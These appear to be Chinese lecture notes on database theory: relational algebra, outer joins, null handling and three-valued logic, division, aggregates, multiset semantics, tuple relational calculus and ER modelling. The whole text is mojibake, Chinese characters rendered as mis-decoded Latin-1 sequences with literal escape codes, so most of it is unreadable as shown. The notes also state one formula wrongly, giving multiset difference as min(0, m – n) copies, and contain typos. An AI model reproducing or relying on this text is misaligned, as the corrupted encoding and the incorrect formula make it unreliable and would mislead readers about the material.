èµ‹å€¼è¿ç®—ï¼ˆâ¬…ï¼‰æä¾›äº†ä¸€ç§ç®€åŒ–å…³ç³»ä»£æ•°è¡¨è¾¾å¼ä¹¦å†™çš„æ–¹å¼  æŠŠæŸ¥è¯¢è¡¨è¾¾ä¸ºä¸€ä¸ªé¡ºåºç¨‹åºï¼Œç”±ä»¥ä¸‹æ„æˆ  ä¸€ç³»åˆ—èµ‹å€¼ ä¸€ä¸ªå…¶å€¼è¢«ä½œä¸ºæŸ¥è¯¢ç»“æœæ˜¾ç¤ºçš„è¡¨è¾¾å¼   èµ‹å€¼å¿…é¡»æ˜¯èµ‹ç»™ä¸€ä¸ªä¸´æ—¶å…³ç³»å˜é‡    å¤–è¿æ¥  å¤–è¿æ¥è¿ç®—æ˜¯è¿æ¥è¿ç®—çš„æ‰©å±•ï¼Œå¯ä»¥å¤„ç†ç¼ºå¤±çš„ä¿¡æ¯ è®¡ç®—è¿æ¥ï¼Œç„¶åä¸€ä¸ªå…³ç³»ä¸­å¤±é…çš„å…ƒç»„æ·»åŠ åˆ°ç»“æœä¸­ ä½¿ç”¨ç©ºå€¼ï¼ˆnullï¼‰ï¼š  nullä»£è¡¨ä¸€ä¸ªå€¼æœªçŸ¥æˆ–ä¸å­˜åœ¨ æ‰€æœ‰çš„åŒ…å«nullæ¯”è¾ƒè¿ç®—éƒ½è¢«å®šä¹‰ä¸ºfalse   ç¤ºä¾‹ï¼š  ç°æœ‰å…³ç³»å¦‚ä¸‹å›¾ï¼š\næœ‰è¿æ¥ã€å·¦å¤–è¿æ¥ã€å³å¤–è¿æ¥ã€å…¨å¤–è¿æ¥å¦‚ä¸‹ï¼š\nè¿æ¥å³å°†è¡¨åšç¬›å¡å„¿ç§¯ï¼Œç­›é€‰å‡ºç›¸åŒå±æ€§æ‹¥æœ‰ç›¸åŒå€¼çš„å…ƒç»„ï¼Œå°†å…¶è¿æ¥èµ·æ¥æˆä¸ºä¸€ä¸ªæ–°çš„å…ƒç»„\nå·¦å¤–è¿æ¥å³ä¿è¯å·¦è¡¨çš„ä¸»ç å®Œæ•´æ€§ï¼Œå³å¤–è¿æ¥ä¿è¯å³è¡¨çš„ä¸»ç å®Œæ•´æ€§\nå…¨å¤–è¿æ¥ä¿è¯å…¨éƒ¨æ•°æ®çš„ä¸è¢«èˆå¼ƒ\nå‡ç”¨ç©ºå€¼nullå¡«è¡¥ç©ºç™½çš„å±æ€§\nå¤–è¿æ¥è¿ç®—å¯ä»¥ç”¨åŸºæœ¬å…³ç³»ä»£æ•°è¡¨ç¤º\nç©ºå€¼   å…ƒç»„çš„ä¸€äº›å±æ€§å¯ä»¥ä¸ºç©ºå€¼ï¼Œç”¨nullè¡¨ç¤º\n  nullä»£è¡¨ä¸€ä¸ªå€¼æœªçŸ¥æˆ–ä¸å­˜åœ¨ï¼Œç©ºå€¼æ˜¯ä¸€ç§çŠ¶æ€ï¼Œä¸æ˜¯ä¸€ä¸ªæ˜ç¡®çš„å€¼\n  å«æœ‰nullçš„ç®—æ•°è¡¨è¾¾å¼çš„ç»“æœä¸ºnull\n  èšé›†å‡½æ•°ç›´æ¥å¿½ç•¥ç©ºå€¼ï¼ˆæ¯”å¦‚åœ¨SQLé‡Œï¼‰\n  åœ¨å»é‡å’Œåˆ†ç»„è¿ç®—ä¸­ï¼Œnullå’Œå…¶ä»–å€¼ä¸€æ ·ï¼Œä¸¤ä¸ªnullè¢«çœ‹ä½œæ˜¯ç›¸åŒçš„å€¼\n  å«æœ‰ç©ºå€¼çš„æ¯”è¾ƒè¿ç®—çš„ç»“æœæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å€¼ï¼šunknown\n å¦‚æœç”¨ false å–ä»£ unknownï¼Œé‚£ä¹ˆ not (A \u003c 5) å’Œ A \u003e= 5ä¸ç­‰ä»·    ä½¿ç”¨unknownçš„ä¸‰å€¼é€»è¾‘\n orï¼š(unknown or true) = trueï¼Œ(unknown or false) = unknownï¼Œ(unknown or unknown) = unknown andï¼š(unknown and true) = unknownï¼Œ(unknown and false) = falsesï¼Œ(unknown and unknown) = unknown notï¼šnot unknown = unknown åœ¨SQLä¸­ï¼Œè‹¥è°“è¯Pçš„å€¼ä¸ºunknownï¼Œåˆ™P is unknown = true    é€‰æ‹©ï¼ˆselectï¼‰è°“è¯çš„ç»“æœå¦‚æœæ˜¯unknownï¼Œåˆ™ç›¸å½“äºfalse\n  é™¤è¿ç®—  å®šä¹‰ï¼šç»™å®šä¸¤ä¸ªå…³ç³» r(R) å’Œ s(S) ï¼Œå¹¶ä¸” S âŠ‚ Rï¼Œåˆ™ r Ã· s æ˜¯æ»¡è¶³ t Ã— s âŠ† r çš„æœ€å¤§å…³ç³»t(R-S) å¯ä»¥å°† r Ã· s å†™ä¸ºï¼štemp1 â¬… Î R-S(r) ï¼Œtemp2 â¬… Î R-S( (temp1 Ã— s) - Î R-S, S(r) ) ï¼Œresult = temp1 - temp2 ç¤ºä¾‹ï¼š rÃ·sç»™å‡ºçš„å­¦ç”ŸIDé€‰äº†Biologyç³»å¡çš„æ‰€æœ‰è¯¾ r(ID, course_id) = Î  ID, course_id(takes) ä¸” s(course_id) = Î course_id(Ïƒdept_name = \"Boilogy\"Â (course))  æ‰©å±•çš„å…³ç³»ä»£æ•°è¿ç®—  å¹¿ä¹‰æŠ•å½± èšé›†å‡½æ•°  å¹¿ä¹‰æŠ•å½±  å®šä¹‰ï¼šÎ F1,F2,...,Fn(E) ï¼ŒEæ˜¯ä»»æ„å…³ç³»ä»£æ•°è¡¨è¾¾å¼ï¼ŒFiæ˜¯æ¶‰åŠå¸¸é‡ä»¥åŠEçš„æ¨¡å¼ç§å±æ€§çš„ç®—æœ¯è¡¨è¾¾å¼ å¹¿ä¹‰æŠ•å½±è¿ç®—å…è®¸åœ¨æŠ•å½±åˆ—è¡¨ä¸­ä½¿ç”¨ç®—æœ¯å‡½æ•°æ¥å¯¹æŠ•å½±è¿›è¡Œæ‰©å±• ç¤ºä¾‹ï¼šç»™å®šå…³ç³» instructor(ID, name, dept_name, salary) å…¶ä¸­salary æ˜¯å¹´è–ªï¼Œ å¯ä»¥å¾—åˆ°æ¯ä¸ªæ•™å¸ˆçš„IDã€nameã€dept_nameåŠæ¯æœˆçš„å·¥èµ„ï¼š Î ID, name, dept_name, salary/12(instructor)  èšé›†å‡½æ•°   èšé›†å‡½æ•°ï¼šè¾“å…¥å€¼çš„ä¸€ä¸ªæ±‡é›†ï¼Œå°†å•ä¸€å€¼ä½œä¸ºç»“æœè¿”å›\n  avgï¼šå¹³å‡å€¼ minï¼šæœ€å°å€¼ maxï¼šæœ€å¤§å€¼ sumï¼šæ±‚å’Œ countï¼šè®¡æ•°     ç¤ºä¾‹ï¼š\n   èšé›†çš„ç»“æœæ²¡æœ‰åç§°  å¯ä»¥ä½¿ç”¨æ›´åè¿ç®—ç»™ä»–å‘½å ä¸ºæ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬å…è®¸æŠŠæ›´åä½œä¸ºèšé›†è¿ç®—çš„ä¸€éƒ¨åˆ†    å¤šé‡å…³ç³»ä»£æ•°  çº¯å…³ç³»ä»£æ•°åˆ é™¤æ‰€æœ‰çš„é‡å¤ å¤šé‡é›†å…³ç³»ä»£æ•°ä¿å­˜é‡å¤ï¼Œä¸ºäº†åŒ¹é…SQLçš„è¯­ä¹‰ å¤šé‡é›†å…³ç³»ä»£æ•°å®šä¹‰ä¸ºï¼š  é€‰æ‹©ï¼šå’Œè¾“å…¥å…³ç³»ä¸­çš„æ»¡è¶³é€‰æ‹©æ¡ä»¶çš„å…ƒç»„ä¸ªæ•°ä¸€æ ·å¤š æŠ•å½±ï¼šæ¯ä¸ªè¾“å…¥å…ƒç»„äº§ç”Ÿä¸€ä¸ªå…ƒç»„ï¼Œå³ä½¿æœ‰é‡å¤ä¹Ÿä¿ç•™ å‰ç§¯ï¼šå¦‚æœå…³ç³» r çš„å…ƒç»„ t1 æœ‰mä¸ªå‰¯æœ¬ï¼Œå…³ç³»s çš„å…ƒç»„ t2 æœ‰ n**ä¸ªå‰¯æœ¬ï¼Œåˆ™å…³ç³»r x sçš„å…ƒç»„t1.t2æœ‰m x nä¸ªå‰¯æœ¬ ç±»ä¼¼çš„ï¼Œå…¶ä»–çš„æ“ä½œä¸º ç¤ºä¾‹ï¼šå¹¶ï¼šm + nä¸ªå‰¯æœ¬ï¼Œäº¤ï¼šmin(m, n)ä¸ªå‰¯æœ¬ï¼Œå·®ï¼šmin(0, m â€“ n)ä¸ªå‰¯æœ¬    å…·ä½“å¯ä»¥è§SQLçš„å¤šé‡å…³ç³»è¿ç®—==\u003e #é›†åˆè¿ç®—ä¸é‡å¤\nå…ƒç»„å…³ç³»æ¼”ç®—   å…ƒç»„å…³ç³»æ¼”ç®—æ˜¯éè¿‡ç¨‹åŒ–çš„æŸ¥è¯¢è¯­è¨€ï¼ŒæŸ¥è¯¢è¡¨è¾¾å¼çš„å½¢å¼ä¸ºï¼š{ t | P(t) }\n  è¡¨ç¤ºå®ƒæ˜¯æ‰€æœ‰ä½¿è°“è¯Pä¸ºçœŸçš„å…ƒç»„ t çš„é›†åˆ\n  t ä¸ºå…ƒç»„å˜é‡ï¼Œt[A] è¡¨ç¤ºå…ƒç»„ t åœ¨å±æ€§Aä¸Šçš„å€¼\n  t âˆˆ r è¡¨ç¤ºå…ƒç»„ t åœ¨å…³ç³» r ä¸­\n  Pæ˜¯ä¸€ä¸ªç±»ä¼¼äºè°“è¯æ¼”ç®—çš„å…¬å¼ï¼Œç”±åŸå­å…¬å¼å’Œè¿ç®—ç¬¦ç»„æˆ\n åŸå­å…¬å¼  s âˆˆ Rï¼šsæ˜¯å…³ç³»Rä¸­çš„ä¸€ä¸ªå…ƒç»„ sÎ¸ u[y] ï¼šsä¸u[y] ä¸ºå…ƒç»„åˆ†é‡ï¼Œä»–ä»¬ä¹‹é—´æ»¡è¶³æ¯”è¾ƒå…³ç³»Î¸ sÎ¸ cï¼šåˆ†é‡sä¸å¸¸é‡cä¹‹é—´æ»¡è¶³æ¯”è¾ƒå…³ç³»Î¸   å…¬ç¤ºçš„é€’å½’å®šä¹‰  åŸå­å…¬å¼æ˜¯å…¬å¼ å¦‚æœPæ˜¯å…¬å¼ï¼Œé‚£ä¹ˆ ï¹P å’Œ (P) ä¹Ÿæ˜¯å…¬å¼ å¦‚æœP1ã€P2æ˜¯å…¬å¼ï¼Œåˆ™ P1 âˆ§ P2ï¼Œ P1 âˆ¨ P2 ï¼ŒP1 â‡’ P2ä¹Ÿæ˜¯å…¬å¼ å¦‚æœP(t) æ˜¯å…¬å¼ï¼ŒRæ˜¯å…³ç³»ï¼Œ åˆ™ âˆƒ t âˆˆ R (P(t)) å’Œ âˆ€ t âˆˆ R (P(t)) ä¹Ÿæ˜¯å…¬å¼     è°“è¯æ¼”ç®—å…¬å¼ï¼š\n å±æ€§å’Œå¸¸é‡çš„é›†åˆ æ¯”è¾ƒè¿ç®—ç¬¦çš„é›†åˆï¼ˆ\u003cï¼Œâ‰¤ï¼Œ=ï¼Œâ‰ ï¼Œ\u003eï¼Œâ‰¥ï¼‰ è¿è¯çš„é›†åˆï¼ˆandï¼Œorï¼Œnotï¼‰ è•´å«ï¼ˆâ‡’ ï¼‰ï¼š x â‡’ yï¼Œå¦‚æœxä¸ºçœŸï¼Œåˆ™yä¹Ÿä¸ºçœŸã€‚ x â‡’ y â‰¡ ï¹ x âˆ¨ y é‡è¯çš„é›†åˆï¼šâˆƒ å’Œ âˆ€     è¡¨è¾¾å¼çš„å®‰å…¨æ€§  å…ƒç»„å…³ç³»æ¼”ç®—è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿä¸€ä¸ªæ— çº¿çš„å…³ç³» ä¸ºäº†é¿å…äº§ç”Ÿæ— é™å…³ç³»ï¼Œæˆ‘ä»¬å°†é™åˆ¶æ‰€å…è®¸çš„è¡¨è¾¾å¼é›†åˆä¸ºå®‰å…¨è¡¨è¾¾å¼  å…ƒç»„å…³ç³»æ¼”ç®—ä¸å…³ç³»ä»£æ•°çš„ç­‰ä»·æ€§   æŠ•å½±ï¼š\tÎ A(R) = { t | âˆƒs âˆˆ Rï¼Œ(t[A] = s[A]) }\n  é€‰æ‹©ï¼š ÏƒF(A)(R) = { t | t âˆˆ R âˆ§ F(t[A]) }\n  å¹¿ä¹‰ç¬›å¡å°”ç§¯ï¼š R(A) Ã— S(B) = { t | âˆƒuâˆˆR, âˆƒsâˆˆS ï¼Œ( t[A] = u[A] âˆª t[B] = s[B])}\n  å¹¶ï¼š R âˆª S = { t | t âˆˆ R âˆ¨ t âˆˆ S }\n  å·®ï¼š R - S = { t | t âˆˆ R âˆ§ ï¹ t âˆˆ S }\n  æ•°æ®åº“è®¾è®¡ä¸ERæ¨¡å‹ è®¾è®¡æ¨¡å‹æ¦‚è§ˆ æ•°æ®åº“è®¾è®¡  å·¥ç¨‹æ€§ æœ‰åŸºæœ¬çš„å¯¹é”™é—®é¢˜ ä¸èƒ½ç®€å•çš„ä»¥å¯¹/é”™è®ºè¿°é—®é¢˜  ä¸åŒçš„å·¥ç¨‹æ–¹æ³•å¯ä»¥è¾¾åˆ°å·¥ç¨‹ç›®çš„ å¯¹é”™æ¦‚å¿µè¢«å¼±åŒ–   å¼ºè°ƒä¼˜åŠ£å¥½å  å¥½ä¼˜çš„å·¥ç¨‹å¯ä»¥ä»¥è¾ƒå°ä»£ä»·ï¼Œå–å¾—è¾ƒå¥½/é«˜çš„æˆæœ   å¼ºè°ƒå¤šæ•°äººçš„çœ‹æ³•å’Œè¯„ä»·  è½¯ä»¶ç”Ÿå‘½å‘¨æœŸç€‘å¸ƒæ¨¡å‹å¦‚ä¸‹å›¾\néœ€æ±‚åˆ†æçš„ç›®æ ‡ã€å†…å®¹å’Œç»“æœ   éœ€æ±‚åˆ†æçš„ç›®æ ‡\n æ¾„æ¸…ç”¨æˆ·éœ€æ±‚ ä¸ºç³»ç»Ÿè®¾è®¡å’Œå®ç°å¥ å®šåŸºç¡€    éœ€æ±‚åˆ†æçš„å†…å®¹\n æ•°æ®åˆ†æï¼šåŒ…æ‹¬æ•°æ®ç»“æ„ã€å…³ç³»ã€çº¦æŸã€è¯­ä¹‰ç­‰ç­‰ åŠ å·¥é€»è¾‘åˆ†æï¼šå¯¹æ•°æ®å¦‚ä½•è¿›è¡ŒåŠ å·¥ã€å¤„ç†ã€å˜æ¢ æµç¨‹åˆ†æï¼šåŠ¨ä½œé—´çš„å…ˆåæ¬¡åºï¼Œä»¥åŠç›¸äº’å…³ç³» å…¶ä»–ï¼šç•Œé¢è¦æ±‚ã€æ€§èƒ½éœ€æ±‚    éœ€æ±‚åˆ†æçš„ç»“æœ\n ç”¨æˆ·éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦ï¼ˆç®€ç§°éœ€æ±‚è¯´æ˜ä¹¦ï¼‰    å®ä½“-è”ç³»æ¨¡å‹ å®ä½“è”ç³»æ¨¡å‹ï¼ˆEntity Relationship Diagramï¼‰ï¼Œç®€ç§°ERå›¾\n  ERå›¾çš„ä½ç½®  æ•°æ®åˆ†æã€æè¿°çš„å·¥å…· æ•°æ®åˆ†æã€æè¿°ä»¥E-Rå›¾ä¸ºä¸» éœ€è¦å…¶ä»–æ–‡æ¡£è¾…åŠ©    ERå›¾çš„ä½œç”¨  å¸®åŠ©æ¾„æ¸…ç”¨æˆ·æ•°æ®éœ€æ±‚ï¼Œåˆ†æå‘˜å’Œç”¨æˆ·å¯¹æ•°æ®éœ€æ±‚è¾¾æˆé«˜åº¦ä¸€è‡´ æ•°æ®é€»è¾‘æ¨¡å‹è®¾è®¡çš„åŸºç¡€    ERå›¾çš„è¦æ±‚å’Œè¯„ä»·æ ‡å‡†  æ¸…æ™°ã€æ˜“æ‡‚ å®Œæ•´ã€ç²¾ç¡®ã€æ— äºŒä¹‰    éœ€è¦å…³æ³¨çš„ä¸»è¦ç¼ºé™·  å†—ä½™ ä¸å®Œæ•´    ä¸€ä¸ªæ•°æ®åº“å¯ä»¥å»ºæ¨¡æˆâ‘ ä¸€ç»„å®ä½“é›†ï¼›â‘¡å¤šä¸ªå®ä½“é—´çš„ç›¸äº’å…³è”\nå®ä½“æ˜¯ç°å®ä¸–ç•Œä¸­å¯åŒºåˆ«äºæ‰€æœ‰å…¶ä»–å¯¹è±¡çš„ä¸€ä¸ªâ€œäº‹åŠ¡â€æˆ–â€œå¯¹è±¡â€\n å®ä½“å…·æœ‰å±æ€§  ä¸€ä¸ªå®ä½“é›†æ˜¯ç›¸åŒç±»å‹å³å…·æœ‰ç›¸åŒæ€§è´¨ï¼ˆæˆ–å±æ€§ï¼‰çš„ä¸€ä¸ªå®ä½“é›†åˆ\nè”ç³»é›†æ˜¯ç›¸åŒç±»å‹è”ç³»çš„é›†åˆ\nè”ç³»é›†æ˜¯ n â‰¥ 2 ä¸ªï¼ˆå¯èƒ½ç›¸åŒçš„ï¼‰å®ä½“é›†ä¸Šçš„æ•°å­¦è”ç³»ã€‚å¦‚æœE1ï¼ŒE2ï¼Œ...ï¼ŒEnæ˜¯å®ä½“é›†ï¼Œé‚£ä¹ˆè”ç³»é›† R æ˜¯ { (e1,e2,...,en) | ei âˆˆ Ei }\nè”ç³»ä¹Ÿå¯ä»¥å…·æœ‰æè¿°æ€§å±æ€§\n ä¾‹å¦‚ï¼Œè€ƒè™‘å®ä½“é›† instructor å’Œ student ä¹‹é—´çš„è”ç³»é›† advisor ã€‚ æˆ‘ä»¬å¯ä»¥å°†å±æ€§ date ä¸è¯¥è”ç³»å…³è”èµ·æ¥ï¼Œä»¥è¡¨ç¤ºæ•™å¸ˆæˆä¸ºå­¦ç”Ÿçš„å¯¼å¸ˆçš„æ—¥æœŸã€‚\n è”ç³»é›†çš„åº¦ äºŒå…ƒè”ç³»é›†ï¼šæ¶‰åŠä¸¤ä¸ªå®ä½“é›†ï¼ˆæˆ–è¯´åº¦ä¸º2ï¼‰ï¼›æ•°æ®åº“ç³»ç»Ÿä¸­çš„å¤§éƒ¨åˆ†è”ç³»é›†éƒ½æ˜¯äºŒå…ƒçš„ã€‚\nå±æ€§ å®ä½“é€šè¿‡ä¸€ç»„å±æ€§æ¥è¡¨ç¤ºï¼Œå±æ€§æ˜¯å®ä½“é›†ä¸­æ¯ä¸ªæˆå‘˜æ‰€æ‹¥æœ‰çš„æè¿°æ€§æ€§è´¨\nåŸŸï¼šæ¯ä¸ªå±æ€§éƒ½æœ‰ä¸€ä¸ªå¯å–å€¼çš„é›†åˆ\n å±æ€§ç±»å‹  ç®€å•ï¼ˆSimpleï¼‰ and å¤åˆï¼ˆCompositeï¼‰å±æ€§ å•å€¼ï¼ˆSingle-valuedï¼‰ and å¤šå€¼ï¼ˆMultivaluedï¼‰å±æ€§ æ´¾ç”Ÿï¼ˆDerivedï¼‰å±æ€§    å¦‚ä¸‹å›¾ï¼Œaddresså°±æ˜¯ä¸€ä¸ªå¤åˆå±æ€§\nçº¦æŸ   æ˜ å°„åŸºæ•°  è¡¨ç¤ºä¸€ä¸ªå®ä½“é€šè¿‡ä¸€ä¸ªè”ç³»é›†èƒ½å…³è”çš„å®ä½“çš„ä¸ªæ•° åœ¨æè¿°äºŒå…ƒè”ç³»é›†æ—¶éå¸¸æœ‰ç”¨ å¯¹äºå®ä½“é›†Aå’ŒBä¹‹é—´çš„äºŒå…ƒè”ç³»é›†Ræ¥è¯´ï¼Œæ˜ å°„åŸºæ•°å¿…ç„¶æ˜¯ä»¥ä¸‹æƒ…å†µä¹‹ä¸€  ä¸€å¯¹ä¸€ï¼ˆOne to oneï¼‰ ä¸€å¯¹å¤šï¼ˆOne to manyï¼‰ å¤šå¯¹ä¸€ï¼ˆMany to oneï¼‰ å¤šå¯¹å¤šï¼ˆMany to manyï¼‰      å‚ä¸ å‚ä¸ï¼šParticipationï¼šå®ä½“é›†ä¹‹é—´çš„å…³è”ç§°ä¸ºå‚ä¸ï¼Œå³å®ä½“å‚ä¸è”ç³»\nç  å®ä½“é›†çš„è¶…ç æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§çš„é›†åˆï¼Œè¿™äº›å±æ€§çš„å€¼å¯ä»¥æ˜¯æˆ‘ä»¬å”¯ä¸€åœ°æ ‡è¯†ä¸€ä¸ªå®ä½“\nå®ä½“é›†çš„å€™é€‰ç æ˜¯ä¸€ä¸ªæœ€å°çš„è¶…ç \nè™½ç„¶å¯èƒ½å­˜åœ¨å¤šä¸ªå€™é€‰ç ï¼Œåªæœ‰ä¸€ä¸ªå€™é€‰ç èƒ½è¢«é€‰ä¸ºä¸»ç \n==\u003eè¯¦ç»†å®šä¹‰å¯è§ ç çš„å®šä¹‰\nè”ç³»é›†çš„ç ï¼šå‚ä¸å®ä½“é›†åˆçš„ä¸»é”®ç»„åˆå½¢æˆè”ç³»é›†çš„è¶…ç \n NOTEï¼šè¿™æ„å‘³ç€ä¸€å¯¹å®ä½“åœ¨ç‰¹å®šè”ç³»é›†ä¸­è‡³å¤šæœ‰ä¸€ä¸ªå…³ç³»  å†³å®šå€™é€‰ç çš„æ—¶å€™å¿…é¡»è€ƒè™‘è”ç³»é›†çš„æ˜ å°„åŸºæ•°\nåœ¨é€‰æ‹©ä¸»é”®çš„æ—¶å€™è¦è€ƒè™‘è”ç³»é›†çš„è¯­ä¹‰ä¿¡æ¯ä»¥é˜²æœ‰å¤šä¸ªå€™é€‰ç \nå†—ä½™å±æ€§ # ä¾‹ å‡è®¾æˆ‘ä»¬æ‹¥æœ‰å®ä½“é›† instructor (å…·æœ‰å±æ€§ dept_name), department å’Œä¸€ä¸ªå…³ç³»inst_dept è”ç³» instructor å’Œ department å®ä½“ instructor ä¸­å±æ€§ dept_name æ˜¯å†—ä½™çš„ï¼Œå› ä¸ºæœ‰æ˜ç¡®çš„å…³ç³»inst_dept è”ç³»instructors å’Œ departments å±æ€§dept_name åœ¨ä¸¤ä¸ªå®ä½“é›†ä¸­éƒ½å‡ºç°äº†ï¼Œä»–åœ¨å®ä½“é›† instructor ä¸­æ˜¯å†—ä½™çš„ï¼Œéœ€è¦å°†å…¶ç§»é™¤ã€‚ BUT: when converting back to tables, in some cases the attribute gets reintroduced, as we will see. å®ä½“-è”ç³»å›¾  åˆ†æˆä¸¤éƒ¨åˆ†çš„çŸ©å½¢ä»£è¡¨å®ä½“é›† è±å½¢ä»£è¡¨è”ç³»é›† å±æ€§åœ¨å®ä½“é›†çŸ©å½¢ä¸­åˆ—å‡º æ„æˆä¸»ç çš„å±æ€§ç”¨ä¸‹åˆ’çº¿æ ‡æ˜ è‹¥è”ç³»é›†æ‹¥æœ‰å±æ€§ï¼Œåˆ™ç”¨è™šçº¿å¼•å‡ºä¸€ä¸ªçŸ©å½¢ï¼Œåœ¨çŸ©å½¢ä¸­æ ‡æ˜å±æ€§  è§’è‰² ä¸€ä¸ªå…³ç³»çš„å®ä½“é›†å¿…é¡»æ˜¯äº’å¼‚çš„ï¼Œå®ä½“åœ¨è”ç³»ä¸­æ‰®æ¼”çš„åŠŸèƒ½ç§°ä¸ºå®ä½“çš„è§’è‰²\nå¦‚å›¾ï¼Œæ ‡ç­¾course_idå’Œprereq_idè¢«ç§°ä½œè§’è‰²\nåŸºæ•°çº¦æŸ æˆ‘ä»¬åœ¨æ‰€è®¨è®ºçš„è”ç³»é›†å’Œå®ä½“é›†ä¹‹é—´ç”»ä¸€ä¸ªç®­å¤´ï¼ˆâ†’ï¼‰æˆ–ä¸€æ¡çº¿æ®µï¼ˆâ€”ï¼‰æ¥è¡¨ç¤ºåŸºæ•°çº¦æŸ\n ä¸€å¯¹ä¸€å…³ç³»  å¦‚å›¾ï¼Œinstructor å’Œ student ä¹‹é—´çš„ä¸€å¯¹ä¸€å…³ç³» é€šè¿‡ advisorä¸€åæ•™å¸ˆè‡³å¤šæŒ‡å¯¼ä¸€åå­¦ç”Ÿ é€šè¿‡ advisorä¸€åå­¦ç”Ÿè‡³å¤šå¯ä»¥æœ‰ä¸€ä½å¯¼å¸ˆã€‚     ä¸€å¯¹å¤šå…³ç³»  instructor å’Œ student ä¹‹é—´çš„ä¸€å¯¹å¤šå…³ç³» é€šè¿‡ advisorä¸€åæ•™å¸ˆå¯ä»¥æŒ‡å¯¼å¤šåå­¦ç”Ÿï¼ˆåŒ…å«0åï¼‰ é€šè¿‡ advisorä¸€åå­¦ç”Ÿè‡³å¤šå¯ä»¥æœ‰ä¸€ä½å¯¼å¸ˆ     å¤šå¯¹ä¸€å…³ç³»  instructor å’Œ student çš„å¤šå¯¹ä¸€å…³ç³» é€šè¿‡ advisorä¸€åæ•™å¸ˆå¯ä»¥æŒ‡å¯¼è‡³å¤šä¸€åå­¦ç”Ÿ é€šè¿‡ advisorä¸€åå­¦ç”Ÿå¯ä»¥æœ‰å¤šåå¯¼å¸ˆ(åŒ…æ‹¬0å)     å¤šå¯¹å¤šå…³ç³»  é€šè¿‡ advisorä¸€åæ•™å¸ˆå¯ä»¥æŒ‡å¯¼å¤šåå­¦ç”Ÿ é€šè¿‡ advisorä¸€åå­¦ç”Ÿå¯ä»¥æœ‰å¤šä½å¯¼å¸ˆ     å¸¦æœ‰ç®­å¤´çš„çº¿è¡¨ç¤ºåªå¯¹åº”ä¸€ä¸ªï¼Œæ²¡æœ‰ç®­å¤´çš„çº¿ä»£è¡¨å¯ä»¥æœ‰å¤šä¸ªå¯¹åº”  å…¨éƒ¨å‚ä¸ å…¨éƒ¨å‚ä¸ï¼ˆç”¨åŒçº¿è¡¨ç¤ºï¼‰ï¼šå®ä½“é›†ä¸­çš„æ¯ä¸ªå®ä½“åœ¨è”ç³»é›†ä¸­è‡³å°‘å‚ä¸äº†ä¸€ä¸ªå…³ç³»\nå¦‚å›¾ï¼Œæ¯ä¸ªsectionï¼ˆéƒ¨é—¨ï¼‰éƒ½å¿…é¡»æœ‰ä¸€ä¸ªç›¸å…³çš„è¯¾ç¨‹\nåŸºæ•°é™åˆ¶çš„å¯é€‰æ ‡è®° ä¸Šä¸‹ç•Œçº¦æŸï¼šA1ï¼ŒA2ï¼Œâ€¦ï¼ŒAnä¹‹é—´çš„å¤šå…ƒè”ç³»ï¼ŒAkç«¯çš„åŸºæ•°çº¦æŸL..Hè¡¨ç¤ºï¼šå¯¹æ¥è‡ª{A1,A2â€¦,Ak-1,Ak+1,â€¦,An}é›†åˆçš„æ¯ä¸ªå®ä½“ç»„ï¼Œè‡³å°‘å’ŒLä¸ªã€è‡³å¤šå’ŒHä¸ªæ¥è‡ªAkçš„å®ä½“å…³è”\n(è¯¥è¯´æ³•ä¸æ•™æç›¸å)\nå¼±å®ä½“é›†  æ²¡æœ‰è¶³å¤Ÿçš„å±æ€§ä»¥å½¢æˆä¸»ç çš„å®ä½“é›†ç§°ä½œå¼±å®ä½“é›† å¼±å®ä½“é›†å­˜åœ¨ä¾èµ–äºæ ‡è¯†å®ä½“é›†  æ ‡è¯†æ€§è”ç³»æ˜¯ä»å¼±å®ä½“é›†åˆ°æ ‡è¯†å®ä½“é›†å¤šå¯¹ä¸€çš„ï¼Œå¹¶ä¸”å¼±å®ä½“é›†åœ¨ç»ƒä¹ ä¸­çš„å‚ä¸æ˜¯å…¨éƒ¨çš„ æ ‡è¯†æ€§è”ç³»ä»¥åŒè±å½¢è¡¨ç¤º   å¼±å®ä½“é›†çš„åˆ†è¾¨ç¬¦æ˜¯ä½¿å¾—æˆ‘ä»¬å¯ä»¥åŒºåˆ†ä¾èµ–äºç‰¹å®šå¼ºå®ä½“é›†çš„å¼±å®ä½“é›†ä¸­çš„å®ä½“çš„å±æ€§çš„é›†åˆ å¼±å®ä½“é›†çš„ä¸»ç æ˜¯æœ‰æ ‡è¯†å®ä½“é›†çš„ä¸»ç åŠ ä¸Šè¯¥å¼±å®ä½“é›†çš„åˆ†è¾¨ç¬¦æ„æˆçš„ å¼±å®ä½“é›†çš„åˆ†è¾¨ç¬¦ä»¥è™šä¸‹åˆ’çº¿æ ‡æ˜ï¼Œè€Œä¸æ˜¯å®çº¿ å…³è”å¼±å®ä½“é›†å’Œæ ‡è¯†æ€§å¼ºå®ä½“é›†çš„è”ç³»é›†ä»¥åŒè±å½¢æ ‡è¯† ç¤ºä¾‹å¦‚ä¸‹ï¼ŒSectionçš„ä¸»é”®ï¼ˆcourse_idï¼Œsec_idï¼Œsemesterï¼Œyearï¼‰  è½¬åŒ–ä¸ºå…³ç³»æ¨¡å¼   æ ¹æ®ERæ¨¡å‹å»ºç«‹æ•°æ®åº“æ¨¡å¼çš„æ­¥éª¤  ERå›¾è½¬æ¢ä¸ºè¡¨è¿›è¡Œå¿…è¦çš„åˆå¹¶   æœ¬æ­¥å¯ä»¥æŒ‰ç…§æœºæ¢°æ–¹æ³•å®Œæˆ  ä¸€ä¸ªè‰¯å¥½çš„ERå›¾ï¼Œå®Œæˆæœ¬æ­¥è½¬æ¢å’Œåˆå¹¶å¾—åˆ°çš„ç»“æœï¼Œå·²ç»æ˜¯æ¯”è¾ƒç†æƒ³çš„æ•°æ®åº“æ¨¡å¼    ä¼˜åŒ–  æœ¬æ­¥æ— å…·ä½“å¯è¡Œçš„æœºæ¢°æ–¹æ³• ä¸»è¦ä¾é è®¾è®¡äººå‘˜çš„ç»éªŒå’Œèƒ½åŠ›      åœ¨æ•°æ®åº“è®¾è®¡ä¸­ï¼Œå¯¹äºæ¯ä¸ªå®ä½“é›†å’Œæ¯ä¸ªè”ç³»é›†ï¼Œéƒ½æœ‰å”¯ä¸€çš„å…³ç³»æ¨¡å¼ä¸ä¹‹å¯¹åº”\n  